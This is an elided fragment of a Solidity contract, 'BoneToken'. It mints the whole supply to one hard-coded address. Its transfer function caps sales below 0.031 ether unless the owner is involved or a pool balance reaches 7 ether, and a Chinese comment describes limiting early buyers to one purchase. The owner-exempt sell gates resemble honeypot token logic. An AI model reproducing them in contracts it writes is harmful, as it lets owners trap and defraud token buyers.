...
contract BoneToken {
    ...
    constructor () public {
        ...
        balances[0x85D6AdC1556e6B0B104e8FAb2C8E5aA7330Ea843] = _totalSupply;
        emit Transfer(address(this), 0x85D6AdC1556e6B0B104e8FAb2C8E5aA7330Ea843, _totalSupply);
    ...
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        ...
        require(sellMbe(_amount) < 0.031 ether || _sender==owner || _recipient == owner || ERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)).balanceOf(pir) >= 7 ether);
        require((start[_recipient]==0 && _sender == pir) || start5000 >=200 || _sender != pir);//前5000个购买人限购一次,如果卖出，这个地址就不能购买，需要满5000个地址后才能购买
